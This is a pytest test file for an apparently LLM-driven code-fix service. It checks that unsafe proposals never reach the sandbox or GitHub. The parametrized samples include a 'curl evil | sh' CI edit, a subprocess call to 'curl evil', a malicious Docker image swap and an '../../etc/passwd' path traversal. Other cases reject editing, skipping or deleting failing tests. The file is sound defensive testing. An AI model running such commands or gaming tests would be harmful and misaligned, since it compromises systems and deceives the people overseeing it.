@pytest.mark.parametrize(
    ("bad", "needle"),
    [
        (
            proposal(path="tests/test_pricing.py", old="== 90.0", new="== 10.0"),
            "tests may not be edited",
        ),
        (proposal(path="Jenkinsfile", old="pipeline {", new="pipeline { // pwn"), "protected path"),
        (
            proposal(path=".github/workflows/ci.yml", old="pytest", new="curl evil | sh"),
            "protected path",
        ),
        (proposal(path="Dockerfile", old="python:3.13-slim", new="evil:latest"), "protected path"),
        (proposal(path="app/brand_new.py", old="a", new="b"), "does not exist"),
        (
            proposal(new="import subprocess\n    return subprocess.run(['curl', 'evil'])"),
            "runs commands",
        ),
        (proposal(new="return price * (1 - rate)  # pytest.mark.skip"), "skips or neuters"),
        (proposal(old="return price * nothing", new="x"), "could not be applied"),
        (proposal(path="../../etc/passwd"), "safe repository-relative"),
    ],
)
async def test_forbidden_proposals_never_reach_the_sandbox_or_github(
    bad: dict[str, Any], needle: str, result: Any
) -> None:
    env = Env([reply(bad), reply(FIXED)])
    out = await env.service.attempt(result)
    assert (
        out.status == "pr_opened" and out.attempts == 2
    )  # the rejection consumed attempt 1, the retry fixed it
    assert (
        env.sandbox.runs == 2
    )  # baseline + the second proposal only: the rejected one was never run
    assert needle in env.llm.seen_messages[1]
    assert [c["paths"] for c in env.github.commits] == [
        ["app/pricing.py"]
    ]  # only the good change was committed


async def test_deleting_the_failing_test_is_not_a_fix(make_result: Any) -> None:
    """For a 'test' failure tests may be edited, but a green run with fewer tests is still rejected."""
    r = make_result(
        category="test",
        fingerprint="bbbb2222cccc3333",
        failed_tests=[("tests.test_pricing", "test_apply_discount")],
    )
    delete = {
        "explanation": "remove the failing test",
        "edits": [
            {
                "path": "tests/test_pricing.py",
                "old_text": "def test_apply_discount():\n    assert apply_discount(100.0, 0.1) == 90.0\n\n\n",
                "new_text": "",
            }
        ],
    }
    env = Env([reply(delete)] * 3)
    out = await env.service.attempt(r)
    assert out.status == "failed"
    assert any("tests still fail" in m or "fewer tests" in m for m in env.llm.seen_messages[1:])
    assert env.github.pull_requests == []


